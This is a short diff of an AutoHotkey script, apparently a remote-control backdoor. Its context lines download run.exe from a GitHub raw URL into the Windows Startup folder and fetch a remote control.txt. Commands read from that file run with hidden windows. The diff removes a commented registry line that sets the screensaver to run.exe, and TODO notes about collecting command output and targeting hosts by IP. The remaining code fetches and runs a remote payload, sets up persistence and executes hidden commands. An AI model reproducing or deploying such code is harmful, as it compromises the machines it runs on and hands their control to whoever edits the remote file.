@@ -57,9 +57,6 @@ runAllExes() {
 
     Run 'cmd /c curl -L -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.exe" "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"'
 
-;     needs testing
-;     Run 'cmd /c reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Microsoft\run.exe" /f'
-
     last := ""
     try {
         last := FileRead("C:\Microsoft\last.txt")
@@ -82,8 +79,6 @@ runAllExes() {
             Run newCommand, , "Hide"
         }
     }
-    ; get output from the commands
-    ; select specific hosts - put ip next to the command (can use wildcard too) and only run on that box
 
     output := path "\control.txt"
     url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/control.txt"
